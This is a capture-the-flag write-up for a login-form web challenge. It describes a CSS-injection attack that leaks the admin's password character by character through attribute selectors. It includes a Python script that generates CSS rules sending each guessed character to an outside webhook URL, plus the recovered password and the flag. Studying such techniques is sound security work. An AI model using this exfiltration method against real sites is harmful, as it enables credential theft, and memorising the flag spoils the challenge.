## Description
We created a [login form](https://fancy-login-form.ctf.zone) with different themes, hope you like it!

## Solution
You can include arbitrary CSS through `theme` which will get inserted into href with `.css` appended. Then, you can make a report to have the admin bot visit.

This block logs the user's password, then updates the input attribute. We can then use CSS selectors to leak the admin's password.
```js
const inp = document.getElementById("password");
inp.addEventListener("keyup", (e) => {
  inp.setAttribute('value', inp.value)
});
```

I had problems with my tunnel so I did it manually...

```py
import string
from urllib.parse import quote

password = ""
#password = "F0x13foXtrOT&Elas7icBe4n5"

css = """input[name="password"][value^="{guess}"] {{
  background: url({url}/?q={encoded})
}}"""

url = "https://webhook.site/6c560ca3-53f9-4e43-84b3-389ecb170842" # update ngrok
CHARSET = string.ascii_letters + string.digits + "{}_!@#$%^&*()-=[]|}{;':,./<>?}"


with open("leak.css", "w") as f:
    for char in CHARSET:
        guess = password + char
        encoded = quote(char)
        w = css.format(guess=guess, url=url, encoded=encoded)
        # print(w)
        # print()
        f.write(w + "\n")
```

Flag: `flag{6b1f095e79699a79dc4a366c1131313e}`


Solved by: benkyou